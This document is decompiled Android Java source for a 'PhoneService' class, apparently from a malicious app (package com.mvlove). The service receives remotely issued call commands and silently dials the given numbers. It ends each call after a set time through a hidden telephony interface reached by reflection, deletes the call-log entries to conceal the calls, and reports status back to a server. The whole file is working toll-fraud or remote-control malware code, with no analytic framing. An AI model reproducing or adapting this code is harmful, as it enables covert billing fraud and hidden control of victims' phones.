package com.mvlove.service;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import com.android.internal.telephony.ITelephony;
import com.mvlove.entity.RemoteCall;
import com.mvlove.entity.RemoteSmsState;
import com.mvlove.util.CallLogUtil;
import com.mvlove.util.HttpReqUtil;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Queue;

@SuppressLint({"HandlerLeak"})
public class PhoneService extends Service {
    public static final String KEY_EXTRA_REMOTECALLS = "remotecalls";
    private static final int WHAT_DISPATCH_CALL = 100;
    private static final int WHAT_END_CALL = 101;
    /* access modifiers changed from: private */
    public boolean isRemoteCalling = false;
    /* access modifiers changed from: private */
    public Queue<RemoteCall> mCalls = new LinkedList();
    /* access modifiers changed from: private */
    public RemoteCall mDailingCall = null;
    /* access modifiers changed from: private */
    public ITelephony mITelephony;
    /* access modifiers changed from: private */
    public ServiceHandler mServiceHandler;
    private Looper mServiceLooper;
    /* access modifiers changed from: private */
    public int phoneState = 0;

    private final class ServiceHandler extends Handler {
        public ServiceHandler(Looper looper) {
            super(looper);
        }

        public void handleMessage(Message msg) {
            switch (msg.what) {
                case PhoneService.WHAT_DISPATCH_CALL /*100*/:
                    removeMessages(PhoneService.WHAT_DISPATCH_CALL);
                    if (!PhoneService.this.isRemoteCalling) {
                        if (PhoneService.this.phoneState == 0) {
                            RemoteCall call = (RemoteCall) PhoneService.this.mCalls.poll();
                            if (call == null) {
                                return;
                            }
                            if (call.getCallAfter().getTime() <= System.currentTimeMillis()) {
                                Intent intent = new Intent("android.intent.action.CALL");
                                intent.setFlags(268435456);
                                intent.setData(Uri.parse("tel://" + call.getCallNumber()));
                                PhoneService.this.startActivity(intent);
                                PhoneService.this.mDailingCall = call;
                                PhoneService.this.isRemoteCalling = true;
                                sendEmptyMessageDelayed(PhoneService.WHAT_END_CALL, call.getDuration().longValue() * 1000);
                                new AsyncTask<Void, Void, Void>() {
                                    /* access modifiers changed from: protected|varargs */
                                    public Void doInBackground(Void... params) {
                                        try {
                                            HttpReqUtil.getUpdateRemoteCallStatus(PhoneService.this.getApplicationContext(), String.valueOf(PhoneService.this.mDailingCall.getId()));
                                        } catch (Exception e) {
                                            e.printStackTrace();
                                        }
                                        return null;
                                    }
                                }.execute(new Void[0]);
                                return;
                            }
                            PhoneService.this.mCalls.add(call);
                            sendEmptyMessageDelayed(PhoneService.WHAT_DISPATCH_CALL, 200);
                            return;
                        }
                        sendEmptyMessageDelayed(PhoneService.WHAT_DISPATCH_CALL, 200);
                        return;
                    }
                    return;
                case PhoneService.WHAT_END_CALL /*101*/:
                    if (PhoneService.this.isRemoteCalling && PhoneService.this.phoneState != 0) {
                        try {
                            PhoneService.this.mITelephony.endCall();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    if (PhoneService.this.mDailingCall != null) {
                        if (PhoneService.this.mDailingCall.isDeleteCallLog()) {
                            CallLogUtil.deleteCalllogByPhone(PhoneService.this.getApplicationContext(), PhoneService.this.mDailingCall.getCallNumber());
                        }
                        PhoneService.this.mDailingCall = null;
                    }
                    PhoneService.this.isRemoteCalling = false;
                    sendEmptyMessageDelayed(PhoneService.WHAT_DISPATCH_CALL, 200);
                    return;
                default:
                    return;
            }
        }
    }

    class TelStateListener extends PhoneStateListener {
        TelStateListener() {
        }

        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            PhoneService.this.phoneState = state;
            switch (state) {
                case RemoteSmsState.STATUS_UNSEND /*0*/:
                    PhoneService.this.isRemoteCalling = false;
                    PhoneService.this.mServiceHandler.sendEmptyMessageDelayed(PhoneService.WHAT_DISPATCH_CALL, 200);
                    return;
                default:
                    return;
            }
        }
    }

    public void onCreate() {
        super.onCreate();
        HandlerThread thread = new HandlerThread("PhoneService");
        thread.start();
        this.mServiceLooper = thread.getLooper();
        this.mServiceHandler = new ServiceHandler(this.mServiceLooper);
        TelephonyManager telephonyMgr = (TelephonyManager) getSystemService("phone");
        try {
            Method getITelephonyMethod = TelephonyManager.class.getDeclaredMethod("getITelephony", null);
            getITelephonyMethod.setAccessible(true);
            this.mITelephony = (ITelephony) getITelephonyMethod.invoke(telephonyMgr, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
        telephonyMgr.listen(new TelStateListener(), 32);
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        ArrayList<RemoteCall> calls = intent.getParcelableArrayListExtra(KEY_EXTRA_REMOTECALLS);
        if (!(calls == null || calls.isEmpty())) {
            Iterator it = calls.iterator();
            while (it.hasNext()) {
                RemoteCall call = (RemoteCall) it.next();
                if (!this.mCalls.contains(call)) {
                    this.mCalls.add(call);
                }
            }
        }
        this.mServiceHandler.sendMessageDelayed(this.mServiceHandler.obtainMessage(WHAT_DISPATCH_CALL), 200);
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        onStart(intent, startId);
        return 3;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
